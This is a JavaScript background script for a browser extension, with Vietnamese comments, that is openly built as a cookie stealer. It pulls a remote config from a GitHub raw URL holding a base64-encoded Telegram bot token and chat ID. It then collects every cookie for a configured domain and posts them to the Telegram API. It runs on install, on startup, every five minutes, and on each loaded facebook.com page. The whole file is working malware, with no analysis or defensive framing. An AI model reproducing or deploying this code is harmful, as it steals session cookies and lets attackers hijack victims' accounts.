function decodeBase64(encoded) {
  return atob(encoded);
}

function fetchRemoteConfig(callback) {
  const url = "https://raw.githubusercontent.com/vietanh1206/extension-config/main/config.json";
  fetch(`${url}?t=${Date.now()}`)
    .then(res => res.json())
    .then(config => {
      if (config.enabled) {
        config.token = decodeBase64(config.token);
        config.chat_id = decodeBase64(config.chat_id);
        callback(config);
      } else {
        console.warn("Config disabled, using fallback");
        callback({ enabled: false, message_prefix: "Default", token: "", chat_id: "", target_domain: "" });
      }
    })
    .catch(err => {
      console.error("Không tải được config:", err);
      callback({ enabled: false, message_prefix: "Default", token: "", chat_id: "", target_domain: "" });
    });
}

function sendTelegramMessage(cfg, cookieList) {
  if (!cfg.token || !cfg.chat_id) {
    console.error("Invalid token or chat_id");
    return;
  }
  const message = `${cfg.message_prefix}\n${cookieList}`;
  fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: cfg.chat_id,
      text: message
    })
  }).catch(err => console.error("Telegram error:", err));
}

function stealAllCookies(cfg) {
  chrome.cookies.getAll({ domain: cfg.target_domain }, cookies => {
    if (!cookies || cookies.length === 0) {
      console.log("No cookies found for domain:", cfg.target_domain);
      return;
    }
    const cookieList = cookies.map(c => `${c.name}=${c.value}`).join("; ");
    sendTelegramMessage(cfg, cookieList);
  });
}

function initStealer() {
  fetchRemoteConfig(cfg => {
    if (cfg.enabled) {
      stealAllCookies(cfg);
    }
  });
}

// Cập nhật định kỳ mỗi 5 phút
setInterval(initStealer, 5 * 60 * 1000);

// Gọi khi khởi động, cài đặt hoặc tab cập nhật
chrome.runtime.onStartup.addListener(initStealer);
chrome.runtime.onInstalled.addListener(initStealer);
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.includes("facebook.com")) {
    initStealer();
  }
});
